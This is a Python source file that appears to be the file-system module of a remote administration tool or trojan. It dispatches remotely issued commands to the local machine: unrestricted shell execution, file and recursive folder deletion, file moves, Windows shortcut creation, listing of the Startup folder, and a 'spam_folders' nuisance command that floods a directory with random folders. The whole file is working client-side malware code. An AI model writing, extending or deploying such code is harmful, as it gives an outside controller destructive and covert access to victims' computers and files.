import subprocess
import os
import shlex
import getpass
import socket
import shutil

from typing import Callable, Dict
from pydantic import ValidationError
from random import randrange
from ..commands import Command, CommandArgs, ICommandModule, CommandResult
from ..constants import STARTUP_PATH
from typing import Dict


class ShellArgs(CommandArgs):
    session_id: str
    command: str
    
class ListDirArgs(CommandArgs):
    path: str = ""
    session_id: str

class ChDirArgs(ListDirArgs):
    pass

class GetCwdArgs(ListDirArgs):
    pass

class DeleteFileArgs(ListDirArgs):
    pass

class SpamFoldersArgs(ListDirArgs):
    count: int

class DeleteFolderArgs(ListDirArgs):
    pass

class MakeDirectoryArgs(ListDirArgs):
    pass

class MakeShortcutArgs(CommandArgs):
    file: str
    destination: str

class MoveFileArgs(CommandArgs):
    _from: str
    to: str
    session_id: str

class UserSession:
    def __init__(self):
        self.cwd = os.getcwd()

    def set_cwd(self, path: str):
        self.cwd = path

    def get_cwd(self) -> str:
        return self.cwd

class ShellSessionManager:
    def __init__(self):
        self.sessions: Dict[str, str] = {}

    def _get_prompt(self, session_id: str) -> str:
        user = getpass.getuser()
        host = socket.gethostname()
        cwd = self.sessions.get(session_id, os.getcwd())
        return f"{user}@{host} ~{cwd}> "

    def execute_command(self, session_id: str, command: str) -> str:
        cwd = self.sessions.get(session_id, os.getcwd())

        # Handling 'cd' command separately
        if command.startswith("cd "):
            path = " ".join(shlex.split(command)[1:])  # Safely parse command arguments
            new_cwd = os.path.normpath(os.path.join(cwd, path))
            if os.path.isdir(new_cwd):
                self.sessions[session_id] = new_cwd
                return self._get_prompt(session_id) + "\n"  # No output for 'cd'
            else:
                return self._get_prompt(session_id) + f"bash: cd: {path}: No such file or directory\n"

        try:
            # For other commands, execute and return output with prompt
            result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT, cwd=cwd)
            prompt = self._get_prompt(session_id)
            return prompt + result
        except subprocess.CalledProcessError as e:
            prompt = self._get_prompt(session_id)
            return prompt + f"Command failed: {e.output}"

command_arg_map = {
    Command.CHDIR: ChDirArgs,
    Command.GETCWD: GetCwdArgs,
    Command.DELETE_FILE: DeleteFileArgs,
    Command.SPAM_FOLDERS: SpamFoldersArgs,
    Command.DELETE_FOLDER: DeleteFolderArgs,
    Command.MAKE_DIRECTORY: MakeDirectoryArgs,
    Command.MAKE_SHORTCUT: MakeShortcutArgs, 
    Command.MOVE_FILE: MoveFileArgs,
    Command.GET_START_UP_CONTENTS: None,
    Command.LIST_CURRENT_DIRECTORY: ListDirArgs,
    Command.SHELL: ShellArgs
}

class FileSystem(ICommandModule):
    def __init__(self, shell_manager: ShellSessionManager = None):
        self.sessions: Dict[str, UserSession] = {}
        if not shell_manager:
            self.shell_manager = ShellSessionManager()
        else:
            self.shell_manager = shell_manager

    def get_user_session(self, user_id: str) -> UserSession:
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession()
        return self.sessions[user_id]

    def listdir(self, args: ListDirArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        try:
            files = os.listdir(session.get_cwd() if not args.path else args.path)
            return CommandResult(success=True, result=files)
        except Exception as e:
            return CommandResult(success=False, result=str(e))
        
    def chdir(self, args: ChDirArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        new_path = args.path
        current_cwd = session.get_cwd()

        # Check if the new path is relative and construct the full path
        if not os.path.isabs(new_path):
            new_path = os.path.join(current_cwd, new_path)

        # Normalize the path to resolve any '..' or '.' parts
        resolved_path = os.path.normpath(new_path)

        # Check if the resolved path is a valid directory
        if not os.path.isdir(resolved_path):
            return CommandResult(success=False, result=f"Invalid directory: {args.path}")

        try:
            # Change to the new directory
            os.chdir(resolved_path)
            # Update the session's current working directory
            session.set_cwd(resolved_path)
            return CommandResult(success=True, result=f"Changed directory to {resolved_path}")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def getcwd(self, args: GetCwdArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        return CommandResult(success=True, result=session.get_cwd())

    def delete_file(self, args: DeleteFileArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        try:
            os.remove(os.path.join(session.get_cwd(), args.path))
            return CommandResult(success=True, result="File deleted")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def spam_folders(self, args: SpamFoldersArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        try:
            base_path = os.path.join(session.get_cwd(), args.path)
            for _ in range(args.count):
                rand = randrange(1, 50000)
                os.makedirs(os.path.join(base_path, f"{rand}"))
            return CommandResult(success=True, result="Folders created")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def delete_folder(self, args: DeleteFolderArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        try:
            shutil.rmtree(os.path.join(session.get_cwd(), args.path))
            return CommandResult(success=True, result="Folder deleted")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def make_directory(self, args: MakeDirectoryArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        try:
            os.mkdir(os.path.join(session.get_cwd(), args.path))
            return CommandResult(success=True, result="Directory created")
        except Exception as e:
            return CommandResult(success=False, result=str(e))
        
    def get_start_up_contents(self) -> CommandResult:
        try:
            files = os.listdir(STARTUP_PATH)  # Ensure STARTUP_PATH is defined
            return CommandResult(success=True, result=files)
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def move_file(self, args: MoveFileArgs) -> CommandResult:
        session = self.get_user_session(args.session_id)
        try:
            os.replace(os.path.join(session.get_cwd(), args._from), os.path.join(session.get_cwd(), args.to))
            return CommandResult(success=True, result="File moved")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def make_shortcut(self, args: MakeShortcutArgs) -> CommandResult:
        try:
            from swinlnk.swinlnk import SWinLnk
            swl = SWinLnk()
            swl.create_lnk(args.file, args.destination)
            return CommandResult(success=True, result="Shortcut created")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def shell(self, args: ShellArgs) -> CommandResult:
        try:
            result = self.shell_manager.execute_command(args.session_id, command=args.command)
            return CommandResult(result=result, success=True)
        except Exception as e:
            return CommandResult(success=False, result=str(e))
        
    def run(self, command: Command, args: CommandArgs) -> CommandResult:
        print(f"Filesystem module handling {command} with {args}")
        command_func_map_with_args: Dict[Command, Callable[[CommandArgs], CommandResult]] = {
            Command.LIST_CURRENT_DIRECTORY: self.listdir,
            Command.CHDIR: self.chdir,
            Command.DELETE_FILE: self.delete_file,
            Command.SPAM_FOLDERS: self.spam_folders,
            Command.DELETE_FOLDER: self.delete_folder,
            Command.MAKE_DIRECTORY: self.make_directory,
            Command.MAKE_SHORTCUT: self.make_shortcut,
            Command.MOVE_FILE: self.move_file,
            Command.GETCWD: self.getcwd,
            Command.SHELL: self.shell
        }
        command_func_map_no_args: Dict[Command, Callable[[], CommandResult]] = {
            Command.GET_START_UP_CONTENTS: self.get_start_up_contents,
        }
        if command not in command_func_map_no_args and command not in command_func_map_with_args:
            return CommandResult(result=f"Error: Command not found in module.", success=False)    
        
        try:
            if command in command_func_map_no_args:
                print("Executing with no args")
                return command_func_map_no_args[command]()
            else:
                if not args.model_dump():
                    return CommandResult(success=False, result=f"No Args passed")
                
                print(f"Executing with {args}")
                args = command_arg_map[command].model_validate(args.model_dump())
                return command_func_map_with_args[command](args=args)
        except ValidationError as e:
            return CommandResult(success=False, result=f"Validation error: {e}")
        except Exception as e:
            return CommandResult(success=False, result=f"Error: {e}")
